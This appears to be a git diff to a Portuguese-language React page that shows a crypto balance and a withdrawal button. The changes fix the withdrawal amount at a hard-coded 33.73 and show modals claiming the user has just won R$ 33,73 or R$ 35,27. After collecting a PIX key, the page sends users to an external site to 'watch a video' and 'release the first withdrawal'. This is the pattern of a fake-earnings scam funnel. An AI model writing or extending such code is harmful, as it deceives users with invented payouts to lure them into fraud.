@@ -2,7 +2,14 @@
 
 import { useBalance } from "@/context/priceContext";
 import { motion, AnimatePresence } from "framer-motion";
-import { Coins, Dice6, IdCard, Mail, Smartphone } from "lucide-react";
+import {
+  CircleCheckBig,
+  Coins,
+  Dice6,
+  IdCard,
+  Mail,
+  Smartphone,
+} from "lucide-react";
 import { MdPix } from "react-icons/md";
 import { useEffect, useState } from "react";
 import CountUp from "react-countup";
@@ -61,6 +68,7 @@ function MoneyInput() {
   const router = useRouter();
 
   const [isModalOpen, setIsModalOpen] = useState(false);
+  const [isVisible2, setIsVisible2] = useState(false);
 
   const handleInputChange = (inputValue: string | undefined) => {
     if (inputValue !== undefined) {
@@ -87,12 +95,21 @@ function MoneyInput() {
 
     setIsModalOpen(false);
     subtractFromBalance(0.00000004);
-    router.replace("/home");
+  };
+
+  const handleOpenModal2 = () => {
+    handleCloseModal();
+    setIsVisible2(true);
   };
 
   return (
     <>
-      <PaymentModal isOpen={isModalOpen} onClose={handleCloseModal} />
+      <ModalFinal2 isOpen={isVisible2} onClose={() => setIsVisible2(false)} />
+      <PaymentModal
+        isOpen={isModalOpen}
+        onClose={handleCloseModal}
+        onClick2={handleOpenModal2}
+      />
       <motion.div
         initial={{ opacity: 0, y: -20 }}
         animate={{ opacity: 1, y: 0 }}
@@ -105,7 +122,8 @@ function MoneyInput() {
           <CurrencyInput
             id="input-example"
             name="input-name"
-            value={value}
+            disabled
+            value={33.73}
             decimalSeparator="." // Usando ponto como separador decimal
             groupSeparator=","
             decimalsLimit={8}
@@ -117,7 +135,9 @@ function MoneyInput() {
           />
 
           <button
-            onClick={handleWithdraw}
+            onClick={() => {
+              handleWithdraw();
+            }}
             className="center h-[55px] rounded-[15px] w-auto px-6 bg-success text-background focus:outline-none !text-white"
           >
             <span className="font-poppinsRegular">Sacar</span>
@@ -138,7 +158,7 @@ interface PaymentModalProps {
   onClose: () => void;
 }
 
-const PaymentModal = ({ isOpen, onClose }: PaymentModalProps) => {
+const PaymentModal = ({ isOpen, onClose, onClick2 }: any) => {
   if (!isOpen) return null;
 
   const [pixKey, setPixKey] = useState(""); // Estado para armazenar o valor do input
@@ -174,7 +194,7 @@ const PaymentModal = ({ isOpen, onClose }: PaymentModalProps) => {
         animate={{ opacity: 1, scale: 1 }}
         exit={{ opacity: 0, scale: 0.8 }}
         transition={{ duration: 0.5 }}
-        className="bg-[#19181d] text-white p-6 rounded-lg shadow-lg w-[98%] max-w-md"
+        className="bg-white text-[#19181d] p-6 rounded-lg shadow-lg w-[98%] max-w-md"
       >
         <h2 className="text-2xl font-poppinsBold mb-4 text-center">
           Enviando seu pagamento...
@@ -185,7 +205,7 @@ const PaymentModal = ({ isOpen, onClose }: PaymentModalProps) => {
         <input
           id="chave-pix"
           name="input-name"
-          className={`w-full h-[55px] p-4 bg-transparent border border-solid border-[#dfdfdf] mb-2 rounded-xl pl-4 text-white`}
+          className={`w-full h-[55px] p-4 bg-transparent border border-solid border-[#dfdfdf] mb-2 rounded-xl pl-4 text-[#19181d]`}
           placeholder="sua chave pix"
           value={pixKey} // Valor controlado pelo estado
           onChange={(e) => setPixKey(e.target.value)} // Atualiza o estado ao digitar
@@ -207,30 +227,74 @@ const ModalFinal = ({ isOpen, onClose }: PaymentModalProps) => {
   const router = useRouter();
 
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center bg-transparent bg-opacity-50">
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#19181d] bg-opacity-50">
       <motion.div
         initial={{ opacity: 0, scale: 0.8 }}
         animate={{ opacity: 1, scale: 1 }}
         exit={{ opacity: 0, scale: 0.8 }}
         transition={{ duration: 0.5 }}
-        className="bg-[#19181d] text-white center-col p-6 rounded-lg shadow-lg w-[98%] h-[320px] max-w-2xl"
+        className="bg-white text-[#19181d] center-col p-6 rounded-lg shadow-lg w-[90%] h-auto py-10 max-w-2xl"
       >
-        <img
-          src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png"
-          className="h-[90px] w-[90px] grayscale mb-5 opacity-80"
-        />
-        <h2 className="text-2xl font-poppinsBold mb-4 text-center">
-          Enviando seu pagamento...
-        </h2>
-        <p className="mb-6 text-center w-full">
-          Em até 5 minutos o PIX vai cair na sua conta.
+        {/* <img
+      src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png"
+      className="h-[90px] w-[90px] grayscale mb-5 opacity-80"
+    /> */}
+        <CircleCheckBig className="h-[90px] w-[90px] text-green-600 mb-5 opacity-80" />
+        <h2 className="text-2xl font-poppinsBold mb-4 text-center">Parabéns</h2>
+        <p className="mb-6 text-center w-full">Você acaba de ganhar R$ 33,73</p>
+
+        <p className="mb-6 mt-1 text-center w-full">
+          Agora, assista a um breve vídeo com o passo a passo para concluir seu
+          cadastro e liberar seu primeiro saque
         </p>
 
         <button
-          onClick={() => router.replace("/")}
+          onClick={() => {
+            window.location.href = "http://www.criptoiia.com/";
+          }}
           className="w-full bg-success text-white py-2  h-[55px] mt-5 rounded-lg hover:bg-success/80 transition-all"
         >
-          Voltar
+          Ver video
+        </button>
+      </motion.div>
+    </div>
+  );
+};
+
+const ModalFinal2 = ({ isOpen, onClose }: any) => {
+  if (!isOpen) return null;
+
+  const router = useRouter();
+
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#19181d] bg-opacity-50">
+      <motion.div
+        initial={{ opacity: 0, scale: 0.8 }}
+        animate={{ opacity: 1, scale: 1 }}
+        exit={{ opacity: 0, scale: 0.8 }}
+        transition={{ duration: 0.5 }}
+        className="bg-white text-[#19181d] center-col p-6 rounded-lg shadow-lg w-[90%] h-auto py-10 max-w-2xl"
+      >
+        {/* <img
+        src="https://cdn-icons-png.flaticon.com/512/2489/2489756.png"
+        className="h-[90px] w-[90px] grayscale mb-5 opacity-80"
+      /> */}
+        <CircleCheckBig className="h-[90px] w-[90px] text-green-600 mb-5 opacity-80" />
+        <h2 className="text-2xl font-poppinsBold mb-4 text-center">Parabéns</h2>
+        <p className="mb-6 text-center w-full">Você acaba de ganhar R$ 35,27</p>
+
+        <p className="mb-6 mt-1 text-center w-full">
+          Agora, assista a um breve vídeo com o passo a passo para concluir seu
+          cadastro e liberar seu primeiro saque
+        </p>
+
+        <button
+          onClick={() => {
+            window.location.href = "http://www.criptoiia.com/";
+          }}
+          className="w-full bg-success text-white py-2  h-[55px] mt-5 rounded-lg hover:bg-success/80 transition-all"
+        >
+          Ver video
         </button>
       </motion.div>
     </div>
@@ -240,11 +304,11 @@ const ModalFinal = ({ isOpen, onClose }: PaymentModalProps) => {
 export default function MainPage() {
   const [isVisible, setIsVisible] = useState(true);
   const { balance } = useBalance();
-
+  const [isVisible2, setIsVisible2] = useState(true);
   useEffect(() => {
     const timer = setTimeout(() => {
       setIsVisible(false);
-    }, 8000); // 8 segundos
+    }, 3000); // 8 segundos
 
     return () => clearTimeout(timer);
   }, []);
@@ -261,14 +325,6 @@ export default function MainPage() {
               exit={{ opacity: 0, y: 20 }}
               transition={{ duration: 0.5 }}
             >
-              <motion.span
-                initial={{ opacity: 0, y: 20 }}
-                animate={{ opacity: 1, y: 0 }}
-                transition={{ duration: 0.5, delay: 0 }}
-                className="center text-xl font-poppinsLight space-x-2 fixed top-0 !translate-y-[-300%] scale-110 right-4"
-              >
-                <BitcoinConverter />
-              </motion.span>
               <h2 className="font-poppinsBold text-3xl text-center">
                 Seu saldo atual é :
               </h2>
@@ -288,6 +344,14 @@ export default function MainPage() {
                     {" "}
                     BTC
                   </span>
+                </motion.span>
+                <motion.span
+                  initial={{ opacity: 0, y: 20 }}
+                  animate={{ opacity: 1, y: 0 }}
+                  transition={{ duration: 0.5, delay: 0 }}
+                  className="center text-xl font-poppinsLight space-x-2 scale-110 right-4"
+                >
+                  <BitcoinConverter />
                 </motion.span>
               </div>
 
